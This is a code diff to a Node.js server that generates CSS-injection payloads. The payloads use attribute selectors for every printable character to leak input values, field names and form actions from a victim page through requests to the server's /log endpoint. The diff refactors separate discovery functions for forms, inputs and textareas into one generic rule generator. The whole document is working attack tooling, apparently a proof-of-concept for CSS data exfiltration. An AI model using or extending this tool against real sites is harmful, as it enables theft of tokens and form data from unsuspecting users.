@@ -6,19 +6,17 @@ const HOSTNAME = "http://localhost:5001";
 const DEBUG = false;
 
 const MAX_ELEMENTS = 20;
+const MAX_VALUE_LEN = 32;
 const MAX_FORMS = 4;
+const MAX_FORM_ACTION_LEN = 50;
+
 const CHARS = String.fromCodePoint(32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126);
 
 var selector = "", attribute = "", prefix = "", postfix = "";
 var pending = [];
-var stop = false, ready = 0, n = 0, hiddenInputs = 0;
+var stop = false, ready = 0, n = 0, variables = [];
 
-var formCount = 0;
-var inputCount = 0
-var textareaCount = 0;
-var forms = [];
-var inputs = []
-var textarea = [];
+var discoverCSS = generateDiscoverCSS();
 
 const requestHandler = (request, response) => {
     let req = url.parse(request.url, url);
@@ -27,57 +25,6 @@ const requestHandler = (request, response) => {
     switch (req.pathname) {
         case "/log":
             response.end();
-            if(formCount) {
-                formCount = +req.query.formCount;
-            }
-            if(inputCount) {
-                inputCount = +req.query.inputCount;
-            }
-            if(textareaCount) {
-                textareaCount = +req.query.textareaCount;
-            }
-
-            for(let i=1;i<=MAX_FORMS;i++) {
-                if(req.query['form'+i+'ActionBegins']) {
-                    if(!forms[i]) {
-                        forms[i] = {};
-                    }
-                    forms[i].begins = req.query['form'+i+'ActionBegins'];
-                }
-                if(req.query['form'+i+'ActionEnds']) {
-                    if(!forms[i]) {
-                        forms[i] = {};
-                    }
-                    forms[i].ends = req.query['form'+i+'ActionEnds'];
-                }
-            }
-
-            for(let i=1;i<=MAX_ELEMENTS;i++) {
-                if(req.query['input'+i+'ValueBegins']) {
-                    if(!inputs[i]) {
-                        inputs[i] = {};
-                    }
-                    inputs[i].valueBegins = req.query['form'+i+'ValueBegins'];
-                }
-                if(req.query['input'+i+'ValueEnds']) {
-                    if(!inputs[i]) {
-                        inputs[i] = {};
-                    }
-                    inputs[i].valueEnds = req.query['form'+i+'ValueEnds'];
-                }
-                if(req.query['input'+i+'NameBegins']) {
-                    if(!inputs[i]) {
-                        inputs[i] = {};
-                    }
-                    inputs[i].nameBegins = req.query['form'+i+'NameBegins'];
-                }
-                if(req.query['input'+i+'NameEnds']) {
-                    if(!inputs[i]) {
-                        inputs[i] = {};
-                    }
-                    inputs[i].nameEnds = req.query['form'+i+'NameBegins'];
-                }
-            }
         break
         case "/discover":
             discoverResponse(response)
@@ -121,18 +68,8 @@ const requestHandler = (request, response) => {
 }
 
 const discoverResponse = (response) => {
-    let css = '';
-    css += discoverForms();
-    css += discoverTextareas();
-    css += discoverInputs();
-    css += `
-            html {
-                background:var(--inputCount,none),var(--formCount,none),var(--textareaCount,none),
-                ${generateVariables()};
-            }
-    `;
     response.writeHead(200, { 'Content-Type': 'text/css'});
-    response.write(css);
+    response.write(discoverCSS);
     response.end();
 };
 
@@ -174,116 +111,62 @@ function escapeCSS(str) {
     return str.replace(/(["\\])/,'\\$1');
 }
 
-function discoverForms() {
+function discoverElements(elementName, checkName, checkValue, checkAction, elementAmount) {
     let css = '';
-    for(let i=1;i<=MAX_FORMS;i++) {
-        css += 'html:has(form:nth-of-type('+i+')){--formCount: url(/log?formCount='+i+');}';
-    }
     for(let i=0;i<CHARS.length;i++) {
-        for(let j=1;j<=MAX_FORMS;j++) {
-            css += 'html:has(form[action^="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--form'+j+'ActionBegins: url(/log?form'+j+'ActionBegins='+encodeURIComponent(CHARS[i])+');}';
+        for(let j=1;j<=elementAmount;j++) {
+            if(checkName) {
+                css += generateRule(elementName, CHARS[i], j, "NameBegins", "name^=");
+                css += generateRule(elementName, CHARS[i], j, "NameEnds", "name$=");
+            }
+            if(checkValue) {
+                css += generateRule(elementName, CHARS[i], j, "ValueBegins", "value^=");
+                css += generateRule(elementName, CHARS[i], j, "ValueEnds", "value$=");
+            }
+            if(checkAction) {
+                css += generateRule(elementName, CHARS[i], j, "ActionBegins", "action^=");
+                css += generateRule(elementName, CHARS[i], j, "ActionEnds", "action$=");
+            }
         }
-        for(let j=1;j<=MAX_FORMS;j++) {
-            css += 'html:has(form[action$="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--form'+j+'ActionEnds: url(/log?form'+j+'ActionEnds='+encodeURIComponent(CHARS[i])+');}';
-        }
+    }
+    if(checkName) {
+        generateTokenVariables(elementName, elementAmount, "NameToken");
+    }
+    if(checkValue) {
+        generateTokenVariables(elementName, elementAmount, "ValueToken");
+    }
+    if(checkAction) {
+        generateTokenVariables(elementName, elementAmount, "ActionToken");
     }
     return css;
 }
 
-function discoverTextareas() {
-    let css = '';
-    for(let i=1;i<=MAX_ELEMENTS;i++) {
-        css += 'html:has(textarea:nth-of-type('+i+')){--textareaCount: url(/log?textareaCount='+i+');}';
-    }
-    for(let i=0;i<CHARS.length;i++) {
-        for(let j=1;j<=MAX_ELEMENTS;j++) {
-            css += 'html:has(textarea[name^="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--textarea'+j+'NameBegins: url(/log?textarea'+j+'NameBegins='+encodeURIComponent(CHARS[i])+');}';
-        }
-    }
-    for(let i=0;i<CHARS.length;i++) {
-        for(let j=1;j<=MAX_ELEMENTS;j++) {
-            css += 'html:has(textarea[name$="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--textarea'+j+'NameEnds: url(/log?textarea'+j+'NameEnds='+encodeURIComponent(CHARS[i])+');}';
-        }
-    }
-    return css;
+function generateRule(elementName, character, nth, variableSuffix, attributeSelector) {
+    let variable = '--'+elementName+nth+variableSuffix;
+    let rule = 'html:has('+elementName+'['+attributeSelector+'"'+escapeCSS(character)+'"]:nth-of-type('+nth+')){--'+elementName+nth+variableSuffix+': url(/log?'+elementName+nth+variableSuffix+'='+encodeURIComponent(character)+');}';
+    variables.push(variable);
+    return rule;
 }
 
-function discoverInputs() {
-    let css = '';
-    for(let i=1;i<=MAX_ELEMENTS;i++) {
-        css += 'html:has(input:nth-of-type('+i+')){--inputCount: url(/log?inputCount='+i+');}';
+function generateTokenVariables(elementName, elementAmount, variableSuffix) {
+    for(let j=1;j<=elementAmount;j++) {
+        variables.push('--'+elementName+j+variableSuffix);
     }
-    for(let i=0;i<CHARS.length;i++) {
-        for(let j=1;j<=MAX_ELEMENTS;j++) {
-            css += 'html:has(input[value^="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--input'+j+'ValueBegins: url(/log?input'+j+'ValueBegins='+encodeURIComponent(CHARS[i])+');}';
-        }
-    }
-    for(let i=0;i<CHARS.length;i++) {
-        for(let j=1;j<=MAX_ELEMENTS;j++) {
-            css += 'html:has(input[value$="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--input'+j+'ValueEnds: url(/log?input'+j+'ValueEnds='+encodeURIComponent(CHARS[i])+');}';
-        }
-    }
-    for(let i=0;i<CHARS.length;i++) {
-        for(let j=1;j<=MAX_ELEMENTS;j++) {
-            css += 'html:has(input[name^="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--input'+j+'NameBegins: url(/log?input'+j+'NameBegins='+encodeURIComponent(CHARS[i])+');}';
-        }
-    }
-    for(let i=0;i<CHARS.length;i++) {
-        for(let j=1;j<=MAX_ELEMENTS;j++) {
-            css += 'html:has(input[name$="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--input'+j+'NameEnds: url(/log?input'+j+'NameEnds='+encodeURIComponent(CHARS[i])+');}';
-        }
-    }
-    return css;
 }
 
 function generateVariables() {
+    return variables.map(e=>'var('+e+',none)').join(',');
+}
+
+function generateDiscoverCSS() {
     let css = '';
-    let rules = [];
-    for(let i=1;i<=MAX_FORMS;i++) {
-        rules.push('var(--form'+i+'ActionBegins,none)');
-    }
-    css += rules.join(',');
-    css += ',';
-    rules = [];
-    for(let i=1;i<=MAX_FORMS;i++) {
-        rules.push('var(--form'+i+'ActionEnds,none)');
-    }
-    css += rules.join(',');
-    css += ',';
-    rules = [];
-    for(let i=1;i<=MAX_ELEMENTS;i++) {
-        rules.push('var(--input'+i+'ValueBegins,none)');
-    }
-    css += rules.join(',');
-    css += ',';
-    rules = [];
-    for(let i=1;i<=MAX_ELEMENTS;i++) {
-        rules.push('var(--input'+i+'ValueEnds,none)');
-    }
-    css += rules.join(',');
-    css += ',';
-    rules = [];
-    for(let i=1;i<=MAX_ELEMENTS;i++) {
-        rules.push('var(--input'+i+'NameBegins,none)');
-    }
-    css += rules.join(',');
-    css += ',';
-    rules = [];
-    for(let i=1;i<=MAX_ELEMENTS;i++) {
-        rules.push('var(--input'+i+'NameEnds,none)');
-    }
-    css += rules.join(',');
-    css += ',';
-    rules = [];
-    for(let i=1;i<=MAX_ELEMENTS;i++) {
-        rules.push('var(--textarea'+i+'NameBegins,none)');
-    }
-    css += rules.join(',');
-    css += ',';
-    rules = [];
-    for(let i=1;i<=MAX_ELEMENTS;i++) {
-        rules.push('var(--textarea'+i+'NameEnds,none)');
-    }
-    css += rules.join(',');
+    css += discoverElements('form', false, false, true, MAX_FORMS);
+    css += discoverElements('input', true, true, false, MAX_ELEMENTS);
+    css += discoverElements('textarea', true, true, false, MAX_ELEMENTS);
+    css += `
+            html {
+                background:${generateVariables()};
+            }
+    `;
     return css;
 }
